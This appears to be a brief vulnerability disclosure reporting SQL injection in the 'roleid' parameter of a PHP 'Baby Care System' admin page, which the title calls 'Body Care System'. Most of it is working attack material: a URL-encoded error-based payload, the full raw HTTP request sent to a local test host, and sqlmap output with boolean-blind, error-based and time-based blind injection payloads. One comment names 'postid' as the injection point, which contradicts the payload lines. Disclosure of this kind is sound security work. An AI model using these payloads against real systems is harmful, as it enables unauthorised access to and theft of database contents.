## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/siteoptions.php&action=display&value=1&roleid=

![image](https://user-images.githubusercontent.com/54017627/161355230-d8f95e3c-6a12-41d5-bbef-d64febe96ca2.png)

Vulnerability location: /BabyCare/admin.php?id=siteoptions&action=display&value=1&roleid=1 //postid is Injection point

[+]Payload: /BabyCare/admin.php?id=siteoptions&action=display&value=1&roleid=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ //roleid is Injection point

```sql
GET /BabyCare/admin.php?id=siteoptions&action=display&value=1&roleid=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h48mjnelp4g0935821l2k3g5ne
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/161355101-54cbb36c-a42a-4a09-ab3c-2779fa673b4c.png)

```sql
---
Parameter: roleid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=siteoptions&action=display&value=1&roleid=1' RLIKE (SELECT (CASE WHEN (1142=1142) THEN 1 ELSE 0x28 END))-- dTza

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=siteoptions&action=display&value=1&roleid=1' AND (SELECT 8760 FROM(SELECT COUNT(*),CONCAT(0x71706a6a71,(SELECT (ELT(8760=8760,1))),0x7170717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OSOo

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=siteoptions&action=display&value=1&roleid=1' AND (SELECT 6807 FROM (SELECT(SLEEP(5)))IKcE)-- PCqd
---
```
![image](https://user-images.githubusercontent.com/54017627/161355203-1c48d2c7-6fda-4f08-a230-6d19511342ab.png)
